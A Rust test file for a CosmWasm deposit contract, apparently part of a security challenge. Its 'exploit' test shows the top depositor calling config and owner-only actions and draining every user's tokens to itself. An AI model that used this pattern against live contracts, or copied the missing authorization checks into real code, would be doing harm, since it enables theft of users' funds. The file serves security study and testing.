#[cfg(test)]
pub mod tests {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER1: &str = "user1";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
            threshold: Uint128::from(99u128),
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        app = mint_tokens(app, USER1.to_string(), Uint128::from(100u128));

        (app, contract_addr)
    }

    pub fn base_scenario() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
            threshold: Uint128::from(99u128),
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // User 1 deposit
        app = mint_tokens(app, USER1.to_string(), Uint128::from(100u128));
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(100, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app = mint_tokens(app, USER2.to_string(), Uint128::from(110u128));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(110, DENOM)],
        )
        .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(100));

        // User 1 deposit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(100, DENOM)],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::zero());

        // Query top depositor
        let top: Addr = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
            .unwrap();
        assert_eq!(top, Addr::unchecked(USER1));

        // User 1 withdraw
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr,
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(100),
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(100));
    }

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        app = mint_tokens(app, USER2.to_string(), Uint128::from(11_000u128));
        app = mint_tokens(app, USER1.to_string(), Uint128::from(10_000u128));

        // User 1 deposit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(11_000, DENOM)],
        )
        .unwrap();

        // Query top depositor
        let top: Addr = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
            .unwrap();
        assert_eq!(top, Addr::unchecked(USER2));

        // we shouldn't be authorized to do this
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::UpdateConfig {
                new_threshold: Uint128::new(20_000),
            },
            &[],
        )
        .unwrap();

        let pwn_msg = cosmwasm_std::BankMsg::Send{
            to_address: USER2.to_string(),
            amount: vec![coin(Uint128::new(21_000).u128(), DENOM)],
        };

        // or this
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction {
                msg: cosmwasm_std::CosmosMsg::Bank(pwn_msg.clone()),
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(21_000));
    }
}
